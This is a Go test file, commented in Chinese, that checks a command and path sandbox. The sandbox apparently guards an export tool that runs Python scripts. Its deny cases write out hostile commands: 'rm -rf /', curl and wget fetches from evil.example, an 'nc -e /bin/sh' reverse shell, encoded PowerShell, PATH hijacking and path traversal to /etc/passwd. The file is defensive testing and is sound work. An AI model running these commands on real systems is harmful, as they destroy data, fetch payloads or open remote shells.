package export

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// ─── 命令沙箱校验 ────────────────────────────────────────────

func TestValidateSandboxedCommand(t *testing.T) {
	tmpFile := filepath.Join(os.TempDir(), "websql_sandbox_test_input.json")
	okCases := []struct {
		name string
		cmd  string
	}{
		{"python 执行脚本", "python " + filepath.Join(getSandboxRoots().workspace, "gen.py") + " out.pptx"},
		{"python3 执行脚本", "python3 " + filepath.Join(getSandboxRoots().workspace, "gen.py")},
		{"pip 安装依赖", "pip install -r " + filepath.Join("skills", "export-ppt", "scripts", "requirements.txt")},
		{"环境变量前缀", "PYTHONIOENCODING=utf-8 python gen.py"},
		{"编码与环境准备", "chcp 65001 && set PYTHONIOENCODING=utf-8 && python gen.py"},
		{"临时目录文件参数", "python gen.py " + tmpFile},
		{"重定向", "python gen.py < " + tmpFile},
	}
	for _, tc := range okCases {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if err := validateSandboxedCommand(tc.cmd); err != nil {
				t.Errorf("validateSandboxedCommand(%q) 应放行，实际拒绝：%v", tc.cmd, err)
			}
		})
	}

	badCases := []struct {
		name string
		cmd  string
	}{
		{"rm -rf", "rm -rf /"},
		{"大小写变体 rm -Rf", "rm -Rf ./data"},
		{"Windows 批量删除", "del /s /q C:\\data"},
		{"powershell 编码执行", "powershell -enc ZQBjAGgAbwA="},
		{"网络外传 curl", "curl http://evil.example/x.sh"},
		{"网络外传 wget", "wget http://evil.example/x"},
		{"反弹 shell", "nc -e /bin/sh 10.0.0.1 4444"},
		{"系统关机", "shutdown /s /t 0"},
		{"非白名单命令", "node evil.js"},
		{"shell 直接执行", "cmd /c whoami"},
		{"环境变量劫持 PATH", "set PATH=.\\evil && python x.py"},
		{"沙箱外绝对路径", sandboxEscapeCommand()},
	}
	for _, tc := range badCases {
		t.Run("deny/"+tc.name, func(t *testing.T) {
			if err := validateSandboxedCommand(tc.cmd); err == nil {
				t.Errorf("validateSandboxedCommand(%q) 应被拒绝，实际放行", tc.cmd)
			}
		})
	}
}

func sandboxEscapeCommand() string {
	if runtime.GOOS == "windows" {
		return "python C:\\Windows\\System32\\evil.py"
	}
	return "python /etc/evil.py"
}

// ── 文件路径沙箱 ────────────────────────────────────────────

func TestResolveWritePath(t *testing.T) {
	// 相对路径 exports/xxx 与工作区相对路径均可写
	if p, err := resolveWritePath(filepath.Join("exports", "a.xlsx")); err != nil {
		t.Errorf("exports 相对路径应可写，实际：%v", err)
	} else if !strings.HasSuffix(p, filepath.Join("exports", "a.xlsx")) {
		t.Errorf("exports 相对路径解析异常：%s", p)
	}
	if _, err := resolveWritePath("ppt_input.json"); err != nil {
		t.Errorf("工作区相对路径应可写，实际：%v", err)
	}
	if _, err := resolveWritePath(filepath.Join(os.TempDir(), "websql_sandbox_test.txt")); err != nil {
		t.Errorf("临时目录应可写，实际：%v", err)
	}

	// 路径穿越与沙箱外路径必须拒绝
	escapeCases := []string{
		filepath.Join("..", "..", "evil.txt"),
		filepath.Join("..", "..", "..", "..", "..", "evil.txt"),
	}
	if runtime.GOOS == "windows" {
		escapeCases = append(escapeCases, `C:\Windows\System32\evil.dll`)
	} else {
		escapeCases = append(escapeCases, "/etc/passwd")
	}
	for _, p := range escapeCases {
		if _, err := resolveWritePath(p); err == nil {
			t.Errorf("resolveWritePath(%q) 应被拒绝，实际放行", p)
		}
	}

	// skills 目录只读：用绝对路径写入必须被拒绝（相对路径 skills/xxx 会落回工作区内的同名子目录，
	// 不会触及真实 skills 目录，属于安全降级行为）
	skillsAbs, err := filepath.Abs(filepath.Join("skills", "export-ppt", "scripts", "x.py"))
	if err != nil {
		t.Fatalf("abs 失败：%v", err)
	}
	if _, err := resolveWritePath(skillsAbs); err == nil {
		t.Error("skills 目录（绝对路径）应只读，写入应被拒绝")
	}
	// 真正落在 skills 目录的相对写入应回落为工作区内路径
	if p, err := resolveWritePath(filepath.Join("skills", "tmp_gen.py")); err == nil {
		wsAbs, _ := filepath.Abs(getSandboxRoots().workspace)
		if !strings.HasPrefix(p, wsAbs) {
			t.Errorf("相对 skills 写入应落回工作区，实际：%s", p)
		}
	}
}

func TestResolveReadPath(t *testing.T) {
	if _, err := resolveReadPath(filepath.Join("skills", "export-ppt", "SKILL.md")); err != nil {
		t.Errorf("skills 目录应可读，实际：%v", err)
	}
	if _, err := resolveReadPath(filepath.Join("data", "reduction", "a.txt")); err != nil {
		t.Errorf("data/reduction 应可读，实际：%v", err)
	}
	if runtime.GOOS == "windows" {
		if _, err := resolveReadPath(`C:\Windows\win.ini`); err == nil {
			t.Error("系统目录应不可读，实际放行")
		}
	} else {
		if _, err := resolveReadPath("/etc/passwd"); err == nil {
			t.Error("系统目录应不可读，实际放行")
		}
	}
}

// ─── 导出文件名路径穿越（回归测试） ──────────────────────────

func TestSanitizeFileNameNoPathTraversal(t *testing.T) {
	cases := []string{
		"../../evil",
		`..\..\evil`,
		".././../etc/passwd",
		`C:\Windows\System32\evil`,
		"/tmp/evil",
		"..",
		".",
		"   ",
		"a/b\\c:d",
	}
	for _, in := range cases {
		got := SanitizeFileName(in, "export")
		if strings.ContainsAny(got, `/\`) {
			t.Errorf("SanitizeFileName(%q) = %q，仍包含路径分隔符", in, got)
		}
		if strings.Contains(got, "..") {
			t.Errorf("SanitizeFileName(%q) = %q，仍包含 ..", in, got)
		}
		// 必须能安全地拼接到 exports 目录下且不发生逃逸
		full := filepath.Join("exports", got+".xlsx")
		abs, err := filepath.Abs(full)
		if err != nil {
			t.Fatalf("abs 失败：%v", err)
		}
		exportsAbs, _ := filepath.Abs("exports")
		if !strings.HasPrefix(abs, exportsAbs) {
			t.Errorf("SanitizeFileName(%q) = %q 拼接后逃逸出 exports：%s", in, got, abs)
		}
	}
}

func TestSanitizeFileNameKeepsNormalName(t *testing.T) {
	got := SanitizeFileName("销售月报", "export")
	if !strings.HasPrefix(got, "销售月报_") {
		t.Errorf("正常中文名应保留，实际：%q", got)
	}
	if got := SanitizeFileName("report.xlsx", "export"); !strings.HasPrefix(got, "report_") {
		t.Errorf("扩展名应被剥离，实际：%q", got)
	}
	if got := SanitizeFileName("", "export"); !strings.HasPrefix(got, "export_") {
		t.Errorf("空名应回退到默认前缀，实际：%q", got)
	}
}